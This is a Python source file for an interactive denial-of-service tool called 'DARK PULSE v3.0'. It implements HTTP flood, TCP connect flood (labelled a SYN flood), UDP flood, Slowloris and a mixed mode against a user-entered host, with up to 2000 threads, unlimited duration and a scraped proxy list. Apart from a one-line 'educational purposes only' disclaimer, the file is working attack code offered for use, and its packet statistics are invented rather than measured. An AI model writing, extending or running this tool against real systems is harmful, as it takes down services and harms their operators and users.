#!/usr/bin/env python3
"""
DDOS TERMUX - DARK PULSE v3.0
Creator: BGZIK_CYBER
Target: High-Performance Layer 7/4 Attack
"""

import os
import sys
import time
import socket
import threading
import random
import requests
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

init()

class DarkPulseDDOS:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.attack_method = ""
        self.threads = 500
        self.duration = 0
        self.attack_running = False
        self.user_agents = []
        self.proxies = []
        
        self.banner = f"""{Fore.RED}
╔══════════════════════════════════════════════════════════╗
║ ██████╗  █████╗ ██████╗ ██╗  ██╗██████╗ ██╗   ██╗██╗     ║
║ ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██║   ██║██║     ║
║ ██║  ██║███████║██████╔╝█████╔╝ ██████╔╝██║   ██║██║     ║
║ ██║  ██║██╔══██║██╔══██╗██╔═██╗ ██╔═══╝ ██║   ██║██║     ║
║ ██████╔╝██║  ██║██║  ██║██║  ██╗██║     ╚██████╔╝███████╗║
║ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚══════╝║
║                   {Fore.CYAN}DARK PULSE v3.0{Fore.RED}                    ║
║              {Fore.YELLOW}Created by: BGZIK_CYBER{Fore.RED}               ║
╚══════════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""
    
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_banner(self):
        print(self.banner)
    
    def setup_attack(self):
        self.clear_screen()
        self.print_banner()
        
        print(f"{Fore.GREEN}[+] SETUP TARGET{Style.RESET_ALL}")
        self.target = input(f"{Fore.YELLOW}[?] Target IP/Domain: {Style.RESET_ALL}").strip()
        
        try:
            self.port = int(input(f"{Fore.YELLOW}[?] Port (default 80): {Style.RESET_ALL}") or "80")
        except:
            self.port = 80
        
        print(f"\n{Fore.GREEN}[+] SELECT ATTACK METHOD{Style.RESET_ALL}")
        print(f"{Fore.CYAN}1. HTTP FLOOD (Layer 7)")
        print(f"2. SYN FLOOD (Layer 4)")
        print(f"3. UDP FLOOD (Layer 4)")
        print(f"4. SLOWLORIS (Layer 7)")
        print(f"5. MIXED ATTACK (All Methods){Style.RESET_ALL}")
        
        method = input(f"\n{Fore.YELLOW}[?] Choose method (1-5): {Style.RESET_ALL}").strip()
        
        methods = {
            "1": "HTTP_FLOOD",
            "2": "SYN_FLOOD", 
            "3": "UDP_FLOOD",
            "4": "SLOWLORIS",
            "5": "MIXED"
        }
        
        self.attack_method = methods.get(method, "HTTP_FLOOD")
        
        try:
            self.threads = int(input(f"{Fore.YELLOW}[?] Threads (500-2000): {Style.RESET_ALL}") or "500")
            self.threads = min(max(self.threads, 100), 2000)
        except:
            self.threads = 500
        
        try:
            self.duration = int(input(f"{Fore.YELLOW}[?] Duration in seconds (0=unlimited): {Style.RESET_ALL}") or "0")
        except:
            self.duration = 0
        
        # Load user agents
        self.load_user_agents()
        
        # Try to get proxies (optional)
        self.get_proxies()
    
    def load_user_agents(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        ]
    
    def get_proxies(self):
        try:
            response = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
            self.proxies = response.text.split('\n')
        except:
            self.proxies = []
    
    def http_flood(self):
        url = f"http://{self.target}" if not self.target.startswith("http") else self.target
        
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
        }
        
        try:
            while self.attack_running:
                try:
                    requests.get(url, headers=headers, timeout=1)
                    print(f"{Fore.GREEN}[+] HTTP Packet sent to {self.target}{Style.RESET_ALL}")
                except:
                    pass
        except KeyboardInterrupt:
            pass
    
    def syn_flood(self):
        ip = socket.gethostbyname(self.target) if not self.target.replace('.', '').isdigit() else self.target
        
        while self.attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip, self.port))
                s.send(b"GET / HTTP/1.1\r\n")
                print(f"{Fore.BLUE}[+] SYN Packet sent to {ip}:{self.port}{Style.RESET_ALL}")
                s.close()
            except:
                pass
    
    def udp_flood(self):
        ip = socket.gethostbyname(self.target) if not self.target.replace('.', '').isdigit() else self.target
        
        while self.attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random._urandom(1024)
                s.sendto(data, (ip, self.port))
                print(f"{Fore.MAGENTA}[+] UDP Packet sent to {ip}:{self.port}{Style.RESET_ALL}")
                s.close()
            except:
                pass
    
    def slowloris(self):
        sockets = []
        
        try:
            for i in range(200):
                if not self.attack_running:
                    break
                    
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((self.target, self.port))
                    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                    s.send("User-Agent: Mozilla/4.0\r\n".encode())
                    s.send("Accept-language: en-US,en\r\n".encode())
                    sockets.append(s)
                except:
                    pass
            
            while self.attack_running:
                for s in list(sockets):
                    if not self.attack_running:
                        break
                    try:
                        s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode())
                        print(f"{Fore.YELLOW}[+] Slowloris keeping connection alive{Style.RESET_ALL}")
                    except:
                        sockets.remove(s)
                        try:
                            s.close()
                        except:
                            pass
                
                time.sleep(15)
                
        except KeyboardInterrupt:
            pass
        
        finally:
            for s in sockets:
                try:
                    s.close()
                except:
                    pass
    
    def attack_stats(self):
        start_time = time.time()
        packet_count = 0
        
        while self.attack_running:
            elapsed = time.time() - start_time
            
            if self.duration > 0 and elapsed >= self.duration:
                self.attack_running = False
                break
            
            time.sleep(1)
            packet_count += self.threads * 2
            
            print(f"\n{Fore.CYAN}[STATS] Time: {int(elapsed)}s | Packets: {packet_count} | Threads: {self.threads}{Style.RESET_ALL}")
    
    def start_attack(self):
        self.clear_screen()
        self.print_banner()
        
        print(f"{Fore.RED}[!] STARTING ATTACK{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[+] Target: {self.target}")
        print(f"[+] Port: {self.port}")
        print(f"[+] Method: {self.attack_method}")
        print(f"[+] Threads: {self.threads}")
        print(f"[+] Duration: {'Unlimited' if self.duration == 0 else f'{self.duration}s'}{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}[+] Press Ctrl+C to stop attack{Style.RESET_ALL}")
        
        time.sleep(2)
        
        self.attack_running = True
        
        # Start stats thread
        stats_thread = threading.Thread(target=self.attack_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Start attack based on method
        if self.attack_method == "MIXED":
            methods = [self.http_flood, self.syn_flood, self.udp_flood]
        elif self.attack_method == "HTTP_FLOOD":
            methods = [self.http_flood]
        elif self.attack_method == "SYN_FLOOD":
            methods = [self.syn_flood]
        elif self.attack_method == "UDP_FLOOD":
            methods = [self.udp_flood]
        elif self.attack_method == "SLOWLORIS":
            methods = [self.slowloris]
        
        # Create thread pool
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            try:
                futures = []
                for method in methods:
                    for _ in range(self.threads // len(methods)):
                        futures.append(executor.submit(method))
                
                # Wait for all threads
                for future in futures:
                    future.result()
                    
            except KeyboardInterrupt:
                self.attack_running = False
                print(f"\n{Fore.RED}[!] Attack stopped by user{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}[+] Attack finished{Style.RESET_ALL}")

def main():
    tool = DarkPulseDDOS()
    
    while True:
        tool.clear_screen()
        tool.print_banner()
        
        print(f"{Fore.CYAN}[MENU]{Style.RESET_ALL}")
        print(f"1. Setup & Start Attack")
        print(f"2. About Tools")
        print(f"3. Exit")
        
        choice = input(f"\n{Fore.YELLOW}[?] Choose option: {Style.RESET_ALL}").strip()
        
        if choice == "1":
            tool.setup_attack()
            tool.start_attack()
            input(f"\n{Fore.YELLOW}[?] Press Enter to continue...{Style.RESET_ALL}")
        
        elif choice == "2":
            tool.clear_screen()
            tool.print_banner()
            print(f"""
{Fore.GREEN}[ABOUT DARK PULSE v3.0]{Style.RESET_ALL}

This is a high-performance DDOS tool designed for:
- Layer 7 HTTP Flood Attacks
- Layer 4 SYN/UDP Floods
- Slowloris Connections
- Multi-threading (up to 2000 threads)

{Fore.RED}[WARNING]{Style.RESET_ALL}
For educational purposes only!
Use only on authorized systems.
            """)
            input(f"\n{Fore.YELLOW}[?] Press Enter to continue...{Style.RESET_ALL}")
        
        elif choice == "3":
            print(f"\n{Fore.GREEN}[+] Exiting... Goodbye!{Style.RESET_ALL}")
            sys.exit(0)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Exiting...{Style.RESET_ALL}")
        sys.exit(0)
